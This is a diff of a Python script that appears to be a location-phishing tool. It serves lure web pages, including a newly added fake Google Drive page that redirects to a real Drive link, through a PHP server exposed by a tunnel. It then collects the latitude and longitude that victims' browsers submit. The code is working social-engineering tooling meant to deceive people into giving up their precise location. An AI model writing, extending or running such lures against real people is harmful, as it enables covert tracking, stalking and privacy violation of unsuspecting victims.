@@ -24,11 +24,11 @@ subdom = args.subdomain
 kml_fname = args.kml
 tunnel_mode = args.tunnel
 
-result = 'template/nearyou/php/result.txt'
-info = 'template/nearyou/php/info.txt'
-site = 'nearyou'
 row = []
-version = '1.2.0'
+site = ''
+info = ''
+result = ''
+version = '1.2.1'
 
 def banner():
 	os.system('clear')
@@ -63,11 +63,35 @@ def tunnel_select():
 	if tunnel_mode == None:
 		serveo()
 	elif tunnel_mode == 'manual':
-		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W)
-		print(G + '[+]' + C + ' Append ' + W + '/nearyou/' + C + ' to tunnel URL...' + W)
+		print(G + '[+]' + C + ' Skipping Serveo, start your own tunnel service manually...' + W + '\n')
 	else:
 		print(R + '[+]' + C + ' Invalid Tunnel Mode Selected, Check Help [-h, --help]' + W + '\n')
 		exit()
+
+def template_select():
+	global site, info, result
+	print(G + '[+]' + C + ' Select a Template : ' + W + '\n')
+	print(G + '[1]' + C + ' NearYou' + W)
+	print(G + '[2]' + C + ' Google Drive' + W)
+	selected = int(input(G + '[>] ' + W))
+	
+	if selected == 1:
+		site = 'nearyou'
+		print('\n' + G + '[+]' + C + ' Loading NearYou Template...' + W)
+	elif selected == 2:
+		site = 'gdrive'
+		print('\n' + G + '[+]' + C + ' Loading Google Drive Template...' + W)
+		redirect = input(G + '[+]' + C + ' Enter GDrive File URL : ' + W)
+		with open('template/gdrive/js/location_temp.js', 'r') as js:
+			reader = js.read()
+			update = reader.replace('REDIRECT_URL', redirect)
+		with open('template/gdrive/js/location.js', 'w') as js_update:
+			js_update.write(update)
+	else:
+		print(R + '[-]' + C + ' Invalid Input, Only Numbers Accepted' + W + '\n')
+
+	info = 'template/{}/php/info.txt'.format(site)
+	result = 'template/{}/php/result.txt'.format(site)
 
 def serveo():
 	global site, subdom
@@ -118,12 +142,13 @@ def serveo():
 				pass
 
 def server():
+	global site
 	print('\n' + G + '[+]' + C + ' Starting PHP Server......' + W, end='')
 	with open('logs/php.log', 'w') as phplog:
-		subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', 'template/'], stdout=phplog, stderr=phplog)
+		subp.Popen(['php', '-S', '0.0.0.0:8080', '-t', 'template/{}/'.format(site)], stdout=phplog, stderr=phplog)
 		time.sleep(3)
 	try:
-		php_rqst = requests.get('http://0.0.0.0:8080/nearyou/index.html')
+		php_rqst = requests.get('http://0.0.0.0:8080/index.html')
 		php_sc = php_rqst.status_code
 		if php_sc == 200:
 			print(C + '[' + G + ' Success ' + C + ']' + W)
@@ -145,7 +170,7 @@ def wait():
 			main()
 
 def main():
-	global result, row, var_lat, var_lon
+	global info, result, row, var_lat, var_lon
 	try:
 		row = []
 		with open (info, 'r') as file2:
@@ -309,6 +334,7 @@ try:
 	banner()
 	ver_check()
 	tunnel_select()
+	template_select()
 	server()
 	wait()
 	main()
